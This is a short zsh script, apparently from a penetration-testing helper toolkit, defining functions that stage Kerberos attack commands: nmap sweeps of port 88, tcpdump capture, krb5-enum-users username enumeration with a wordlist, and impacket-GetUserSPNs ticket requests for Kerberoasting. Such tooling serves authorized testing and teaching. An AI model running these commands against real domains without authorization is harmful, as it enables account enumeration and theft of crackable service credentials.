#!/usr/bin/env zsh

############################################################# 
# qq-enum-kerb
#############################################################

qq-enum-kerb-sweep-nmap() {
  __GET-NETWORK
  print -z "nmap -n -Pn -sS -p88 ${__NETWORK}"
}

qq-enum-kerb-tcpdump() {
  __GET-IFACE
  __GET-RHOST
  print -z "tcpdump -i ${__IFACE} host ${__RHOST} and tcp port 88"
}

qq-enum-kerb-users() {
  __GET-RHOST
  local realm && read "realm?REALM: "
  print -z "nmap -vvv -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm=${realm},userdb=/usr/share/seclists/Usernames/Names/names.txt ${__RHOST}"
}

qq-enum-kerb-kerberoast() {
  local d && read "d?DOMAIN: "
  local u && read "u?SERVICE USER: "
  local dc && read "dc?DC(IP): "
  __warn "Ensure that the domain, ${d}, is in your hosts file."
  print -z "impacket-GetUserSPNs -request ${d}/${u} -dc-ip ${dc} "
}
